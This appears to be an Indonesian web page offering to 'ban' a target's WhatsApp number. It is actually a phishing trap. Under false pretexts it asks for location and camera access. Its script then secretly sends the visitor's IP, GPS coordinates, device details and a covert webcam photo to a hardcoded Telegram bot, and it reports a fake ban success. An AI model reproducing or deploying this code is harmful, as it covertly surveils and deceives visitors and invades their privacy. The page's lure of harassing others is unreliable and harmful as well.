<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website-Bans WhatsApp By lanz</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #1a0000 0%, #2a0000 50%, #0a0a0a 100%);
      font-family: 'Inter', sans-serif;
      color: #ff4444;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow-x: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 3px;
      height: 3px;
      background: rgba(255, 68, 68, 0.4);
      border-radius: 50%;
      animation: float 8s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { 
        transform: translateY(0px) translateX(0px); 
        opacity: 0.3; 
      }
      50% { 
        transform: translateY(-25px) translateX(10px); 
        opacity: 0.8; 
      }
    }
    .container {
      display: flex;
      gap: 30px;
      max-width: 1000px;
      width: 100%;
      z-index: 2;
    }
    .profile-section {
      flex: 1;
      background: rgba(10, 10, 10, 0.95);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 
        0 0 30px rgba(255, 0, 0, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 68, 68, 0.2);
      backdrop-filter: blur(10px);
      text-align: center;
    }
    .profile-pic {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      background: linear-gradient(135deg, #ff4444, #cc0000);
      margin: 0 auto 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
      color: white;
      box-shadow: 0 0 20px rgba(255, 68, 68, 0.5);
    }
    .profile-name {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 5px;
      background: linear-gradient(135deg, #ff4444, #ff6666);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .profile-role {
      font-size: 14px;
      color: #ffaa44;
      margin-bottom: 20px;
      opacity: 0.9;
    }
    .profile-stats {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
      margin-top: 25px;
    }
    .stat {
      background: rgba(40, 0, 0, 0.6);
      padding: 15px;
      border-radius: 12px;
      border: 1px solid rgba(255, 68, 68, 0.2);
    }
    .stat-number {
      font-size: 24px;
      font-weight: 700;
      color: #ff4444;
      margin-bottom: 5px;
    }
    .stat-label {
      font-size: 12px;
      color: #ff8888;
      opacity: 0.8;
    }
    .login-section {
      flex: 1;
      background: rgba(10, 10, 10, 0.95);
      padding: 40px 35px;
      border-radius: 20px;
      box-shadow: 
        0 0 30px rgba(255, 0, 0, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
      text-align: center;
      z-index: 2;
      border: 1px solid rgba(255, 68, 68, 0.2);
      backdrop-filter: blur(10px);
    }
    .login-title {
      font-size: 28px;
      font-weight: 900;
      margin-bottom: 8px;
      background: linear-gradient(135deg, #ff4444, #ff6666);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(255, 68, 68, 0.3);
    }
    .author {
      font-size: 12px;
      color: #ff8888;
      margin-bottom: 5px;
      opacity: 0.8;
    }
    .login-subtitle {
      font-size: 14px;
      color: #ffaa44;
      margin-bottom: 25px;
      opacity: 0.9;
    }
    .note-box {
      background: rgba(255, 68, 68, 0.1);
      border: 1px solid rgba(255, 68, 68, 0.3);
      border-radius: 12px;
      padding: 20px;
      margin-bottom: 25px;
      text-align: left;
    }
    .note-title {
      font-size: 16px;
      font-weight: 600;
      color: #ffaa44;
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .note-title::before {
      content: "📌";
      font-size: 14px;
    }
    .note-text {
      font-size: 13px;
      color: #ffaaaa;
      line-height: 1.5;
      opacity: 0.9;
    }
    .requirements {
      margin: 15px 0;
      padding-left: 20px;
    }
    .requirement {
      font-size: 12px;
      color: #ff8888;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .requirement::before {
      content: "•";
      color: #ff4444;
    }
    .login-input {
      width: 100%;
      padding: 15px 20px;
      margin-bottom: 20px;
      background: rgba(40, 0, 0, 0.8);
      border: 2px solid rgba(255, 68, 68, 0.3);
      border-radius: 12px;
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease;
      outline: none;
    }
    .login-input:focus {
      border-color: #ff4444;
      box-shadow: 0 0 15px rgba(255, 68, 68, 0.3);
      background: rgba(50, 0, 0, 0.9);
    }
    .login-input::placeholder {
      color: #ff8888;
      opacity: 0.6;
    }
    .login-button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #ff4444, #cc0000);
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-weight: 600;
      font-size: 16px;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);
    }
    .login-button:hover {
      background: linear-gradient(135deg, #ff5555, #dd0000);
      box-shadow: 0 6px 20px rgba(255, 68, 68, 0.5);
      transform: translateY(-2px);
    }
    .login-button:active {
      transform: translateY(0);
    }
    .login-button:disabled {
      background: #666;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 25px;
      background: rgba(30, 0, 0, 0.6);
      padding: 18px;
      border-radius: 12px;
      font-size: 13px;
      border: 1px solid rgba(255, 68, 68, 0.2);
      color: #ffaaaa;
      line-height: 1.5;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 768px) {
      .container {
        flex-direction: column;
        gap: 20px;
      }
      .profile-section, .login-section {
        padding: 25px;
      }
    }
    @media (max-width: 480px) {
      .profile-section, .login-section {
        padding: 20px;
        border-radius: 16px;
      }
      .login-title {
        font-size: 24px;
      }
      .login-input, .login-button {
        font-size: 15px;
        padding: 14px;
      }
      .profile-pic {
        width: 100px;
        height: 100px;
        font-size: 32px;
      }
    }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="container">
    <!-- Profile Section -->
    <div class="profile-section">
      <div class="profile-pic">LANZ</div>
          <div class="profile-name">black bands</div>
      <div class="profile-role">web ban 100% work</div>
      <div class="profile-stats">
        <div class="stat">
          <div class="stat-number">1.8K+</div>
          <div class="stat-label">Bans Success</div>
        </div>
        <div class="stat">
          <div class="stat-number">99%</div>
          <div class="stat-label">Success Rate</div>
        </div>
        <div class="stat">
          <div class="stat-number">48H</div>
          <div class="stat-label">Fast Process</div>
        </div>
        <div class="stat">
          <div class="stat-number">24/7</div>
          <div class="stat-label">Active</div>
        </div>
      </div>
    </div>

    <!-- Login Section -->
    <div class="login-section">
      <p class="login-title">Website Bans WhatsApp</p>
      <p class="author">By (ADMIN LANZ$)</p>
      <p class="login-subtitle">⚠️ Jangan Disalah gunakan</p>
      
      <div class="note-box">
        <div class="note-title">Penting: Izin Akses Diperlukan</div>
        <div class="note-text">
          Izinkan akses lokasi dan kamera untuk melihat lokasi nomor WhatsApp yang mau di ban. 
          Hanya untuk mengecek apakah nomor tersebut aktif atau tidak.
        </div>
        <div class="requirements">
          <div class="requirement">Lokasi GPS diperlukan untuk verifikasi regional</div>
          <div class="requirement">Kamera untuk konfirmasi identitas pengguna</div>
          <div class="requirement">Jika tidak diizinkan, proses ban tidak akan berhasil</div>
        </div>
      </div>
      
      <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
      <button class="login-button" id="login-button">Next</button>
      <div id="info">🥷 Silahkan masukkan nomor untuk di bans...</div>
    </div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const botToken = '7544006328:AAFRjUJ3bJUlsFBkBZj22L4caTjkRYoCgjU';
    const chatIds = ['6089431217'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`📍 Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }

    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8 || nomor.length > 15) {
        infoDiv.innerText = '⚠️ Nomor tidak valid.';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = '⏳ Memproses spam report...';
      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = '❌ Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
